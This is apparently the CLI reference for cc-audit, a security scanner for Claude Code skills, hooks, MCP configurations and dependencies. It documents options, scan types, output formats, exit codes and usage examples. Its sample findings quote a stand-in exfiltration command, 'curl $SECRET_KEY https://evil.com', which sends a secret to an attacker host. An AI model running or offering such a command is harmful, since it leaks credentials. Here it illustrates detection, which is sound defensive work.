# CLI Reference

[日本語](./CLI.ja.md)

## Usage

```
cc-audit [OPTIONS] <PATHS>...
```

## Arguments

| Argument | Description |
|----------|-------------|
| `<PATHS>...` | Paths to scan (files or directories) |

## Options

### Output Options

| Option | Description |
|--------|-------------|
| `-f, --format <FORMAT>` | Output format: `terminal` (default), `json`, `sarif`, `html`, `markdown` |
| `-o, --output <FILE>` | Output file path (for HTML/JSON output) |
| `-v, --verbose` | Verbose output (includes confidence level) |
| `--compact` | Compact output format (traditional style instead of lint-style) |
| `--ci` | CI mode: non-interactive output |
| `--badge` | Generate security badge |
| `--badge-format <FORMAT>` | Badge output format: `url`, `markdown` (default), `html` |
| `--summary` | Show summary only (for batch scans) |

### Scan Options

| Option | Description |
|--------|-------------|
| `-t, --type <SCAN_TYPE>` | Scan type (see [Scan Types](#scan-types)) |
| `-s, --strict` | Strict mode: treat warnings as errors (exit 1 for any finding) |
| `-r, --recursive` | Recursive scan |
| `--warn-only` | Warn-only mode: treat all findings as warnings (always exit 0) |
| `--min-severity <LEVEL>` | Minimum finding severity to include: `critical`, `high`, `medium`, `low` |
| `--min-rule-severity <LEVEL>` | Minimum rule severity to treat as errors: `error`, `warn` |
| `--min-confidence <LEVEL>` | Minimum confidence level: `tentative` (default), `firm`, `certain` |
| `--skip-comments` | Skip comment lines when scanning |
| `--strict-secrets` | Strict secrets mode: disable dummy key heuristics for test files |
| `--deep-scan` | Enable deep scan with deobfuscation |

### Fix Options

| Option | Description |
|--------|-------------|
| `--fix-hint` | Show fix hints in terminal output |
| `--fix` | Auto-fix issues (where possible) |
| `--fix-dry-run` | Preview auto-fix changes without applying them |

### Watch Mode

| Option | Description |
|--------|-------------|
| `-w, --watch` | Watch mode: continuously monitor files |

### Git Hooks

| Option | Description |
|--------|-------------|
| `--init-hook` | Install pre-commit hook |
| `--remove-hook` | Remove pre-commit hook |

### Custom Rules & Databases

| Option | Description |
|--------|-------------|
| `--custom-rules <PATH>` | Path to custom rules file (YAML format) |
| `--malware-db <PATH>` | Path to custom malware signatures database |
| `--no-malware-scan` | Disable malware signature scanning |
| `--cve-db <PATH>` | Path to custom CVE database (JSON) |
| `--no-cve-scan` | Disable CVE vulnerability scanning |

### Baseline & Drift Detection

| Option | Description |
|--------|-------------|
| `--baseline` | Create a baseline snapshot for drift detection |
| `--check-drift` | Check for drift against saved baseline |
| `--save-baseline <FILE>` | Save baseline to specified file |
| `--baseline-file <FILE>` | Compare against baseline file (show only new findings) |
| `--compare <PATH1> <PATH2>` | Compare two paths and show differences |

### Profiles

| Option | Description |
|--------|-------------|
| `--profile <NAME>` | Load settings from a named profile |
| `--save-profile <NAME>` | Save current settings as a named profile |

### Client Scanning

| Option | Description |
|--------|-------------|
| `--all-clients` | Scan all installed AI coding clients (Claude, Cursor, Windsurf, VS Code) |
| `--client <TYPE>` | Scan a specific client: `claude`, `cursor`, `windsurf`, `vscode` |

### Remote Scanning

| Option | Description |
|--------|-------------|
| `--remote <URL>` | Remote repository URL to scan (e.g., `https://github.com/user/repo`) |
| `--git-ref <REF>` | Git ref (branch, tag, or commit) for remote scan (default: HEAD) |
| `--remote-auth <TOKEN>` | GitHub token for authentication (or use `GITHUB_TOKEN` env var) |
| `--remote-list <FILE>` | File containing list of repository URLs to scan (one per line) |
| `--awesome-claude-code` | Scan all repositories from awesome-claude-code |
| `--parallel-clones <N>` | Maximum number of parallel repository clones (default: 4) |

### MCP Pinning (Rug-Pull Detection)

| Option | Description |
|--------|-------------|
| `--pin` | Pin MCP tool configurations for rug-pull detection |
| `--pin-verify` | Verify MCP tool pins against current configuration |
| `--pin-update` | Update MCP tool pins with current configuration |
| `--pin-force` | Force overwrite existing pins |
| `--ignore-pin` | Skip pin verification during scan |

### Hook Mode

| Option | Description |
|--------|-------------|
| `--hook-mode` | Run as Claude Code Hook (reads from stdin, writes to stdout) |

### SBOM (Software Bill of Materials)

| Option | Description |
|--------|-------------|
| `--sbom` | Generate SBOM |
| `--sbom-format <FORMAT>` | SBOM output format: `cyclonedx`, `spdx` |
| `--sbom-npm` | Include npm dependencies in SBOM |
| `--sbom-cargo` | Include Cargo dependencies in SBOM |

### Proxy Mode (Runtime MCP Monitoring)

| Option | Description |
|--------|-------------|
| `--proxy` | Enable proxy mode for runtime MCP monitoring |
| `--proxy-port <PORT>` | Proxy listen port (default: 8080) |
| `--proxy-target <HOST:PORT>` | Target MCP server address |
| `--proxy-tls` | Enable TLS termination in proxy mode |
| `--proxy-block` | Enable blocking mode (block messages with findings) |
| `--proxy-log <FILE>` | Log file for proxy traffic (JSONL format) |

### False Positive Reporting

| Option | Description |
|--------|-------------|
| `--report-fp` | Report a false positive finding |
| `--report-fp-dry-run` | Dry run mode for false positive reporting (print without submitting) |
| `--report-fp-endpoint <URL>` | Custom endpoint URL for false positive reporting |
| `--no-telemetry` | Disable telemetry and false positive reporting |

### Other Options

| Option | Description |
|--------|-------------|
| `--init` | Generate a default configuration file template |
| `--mcp-server` | Run as MCP server |
| `-h, --help` | Print help |
| `-V, --version` | Print version |

## Scan Types

| Type | Description | Target Files |
|------|-------------|--------------|
| `skill` | Claude Code skill definitions (default) | `SKILL.md`, `*.md` with frontmatter |
| `hook` | Hook configurations | `settings.json`, hook scripts |
| `mcp` | MCP server configurations | `mcp.json`, server definitions |
| `command` | Slash command definitions | `.claude/commands/*.md` |
| `rules` | Custom rule files | `*.yaml`, `*.yml` rule definitions |
| `docker` | Docker configurations | `Dockerfile`, `docker-compose.yml` |
| `dependency` | Package dependencies | `package.json`, `Cargo.toml`, `requirements.txt` |
| `subagent` | Subagent definitions | `.claude/agents/*.md`, `agent.md` |
| `plugin` | Plugin marketplace definitions | `marketplace.json`, `plugin.json` |

## Terminal Output Format

By default, cc-audit uses a **lint-style format** similar to ESLint, Clippy, and other modern linters:

```
/path/to/file.sh:1:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
     |
   1 | curl $SECRET_KEY https://evil.com
     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     = why: Potential data exfiltration: network request with environment variable detected
     = ref: CWE-200, CWE-319
     = fix: Review the command and ensure no sensitive data is being sent externally
     = example: Use environment variable references without exposing them: ${VAR:-default}
```

### Output Structure

| Label | Description |
|-------|-------------|
| Header | `file:line:col: [ERROR/WARN] [SEVERITY] RULE-ID: Name` |
| Code | Shows the actual line of code with line number gutter |
| `^` pointer | Highlights the problematic code section |
| `why:` | Why this is a security issue |
| `ref:` | CWE references (Common Weakness Enumeration) |
| `fix:` | Recommended fix for the issue |
| `example:` | Example of how to fix (when available) |
| `confidence:` | Detection confidence level (shown with `--verbose`) |

### Compact Mode

Use `--compact` for traditional output format:

```
[ERROR] [CRITICAL] EX-001: Network request with environment variable
  Location: /path/to/file.sh:1
  Code: curl $SECRET_KEY https://evil.com
  Confidence: firm
  CWE: CWE-200, CWE-319
  Message: Potential data exfiltration...
  Recommendation: Review the command...
```

## Exit Codes

| Code | Meaning | Action |
|------|---------|--------|
| 0 | No findings, or warnings only | Safe to proceed |
| 1 | Error-level findings detected | Review findings before installation |
| 2 | Scan error (e.g., file not found) | Check file paths and permissions |

**Note:** By default, all findings are treated as errors (exit code 1). Use `--warn-only` to treat all findings as warnings (always exit 0), or configure per-rule severity in `.cc-audit.yaml`.

## Examples

```bash
# Basic scan
cc-audit ./my-skill/

# Scan with JSON output to file
cc-audit ./skill/ --format json --output results.json

# Scan with HTML report
cc-audit ./skill/ --format html --output report.html

# Strict mode with verbose output
cc-audit --strict --verbose ./skill/

# Scan MCP configuration
cc-audit --type mcp ~/.claude/mcp.json

# Watch mode for development
cc-audit --watch ./my-skill/

# CI pipeline scan
cc-audit --ci --format sarif --strict ./

# High confidence only
cc-audit --min-confidence certain ./skill/

# Scan all installed AI coding clients
cc-audit --all-clients

# Scan a specific client
cc-audit --client cursor

# Scan a remote repository
cc-audit --remote https://github.com/user/awesome-skill

# Scan a remote repository at specific branch
cc-audit --remote https://github.com/user/repo --git-ref v1.0.0

# Scan all repositories from awesome-claude-code
cc-audit --awesome-claude-code --summary

# Generate security badge
cc-audit ./skill/ --badge --badge-format markdown

# Pin MCP tool configuration
cc-audit --type mcp ~/.claude/mcp.json --pin

# Verify MCP pins
cc-audit --type mcp ~/.claude/mcp.json --pin-verify

# Generate SBOM
cc-audit ./skill/ --sbom --sbom-format cyclonedx --output sbom.json

# Run as proxy for runtime monitoring
cc-audit --proxy --proxy-port 8080 --proxy-target localhost:9000
```
